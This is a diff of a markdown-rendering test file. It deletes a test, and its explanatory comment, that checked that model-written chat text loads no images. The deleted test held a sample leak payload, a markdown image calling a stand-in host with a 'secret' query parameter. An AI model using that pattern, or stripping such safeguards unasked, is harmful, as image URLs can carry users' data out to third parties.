@@ -1,5 +1,5 @@
-// How markdown renders (src/web/markdown.tsx): only attachments load as images; any other image is a link, and text a
-// model wrote (the chat panel's `images={false}`) loads no image at all. Like editor.test.ts it imports src/, on happy-dom.
+// How markdown renders (src/web/markdown.tsx): only attachments load as images; any other image is a link.
+// Like editor.test.ts it imports src/, on happy-dom.
 import { afterAll, expect, test } from "bun:test";
 import { Window } from "happy-dom";
 
@@ -21,11 +21,11 @@ const { AppContext } = await import("../src/web/context.ts");
 const { Markdown } = await import("../src/web/markdown.tsx");
 
 /** The HTML Markdown renders for `text`, in a workspace with no teams or members. */
-function render(text: string, images?: boolean): string {
+function render(text: string): string {
   const host = document.createElement("div");
   const root = createRoot(host);
   const app = { teams: [], members: [], workspace: null } as never;
-  flushSync(() => root.render(createElement(AppContext.Provider, { value: app }, createElement(Markdown, { text, images }))));
+  flushSync(() => root.render(createElement(AppContext.Provider, { value: app }, createElement(Markdown, { text }))));
   const html = host.innerHTML;
   root.unmount();
   return html;
@@ -49,11 +49,4 @@ test("attachment links open in a new tab, not in the app", () => {
   const html = render("[build.log](/api/attachments/AttachmentFixture00002/build.log) [doc](/doc/plan)");
   expect(html).toContain('<a href="/api/attachments/AttachmentFixture00002/build.log" target="_blank" rel="noopener noreferrer">build.log</a>');
   expect(html).toMatch(/<a href="[^"]*\/doc\/plan">doc<\/a>/);
-});
-
-test("text a model wrote (the chat panel) loads no image, not even an attachment", () => {
-  const html = render(`![shot](${SHOT}) ![leak](https://evil.example/x.png?d=secret)`, false);
-  expect(html).not.toContain("<img");
-  expect(html).not.toContain("evil.example");
-  expect(html).toContain("shot");
 });
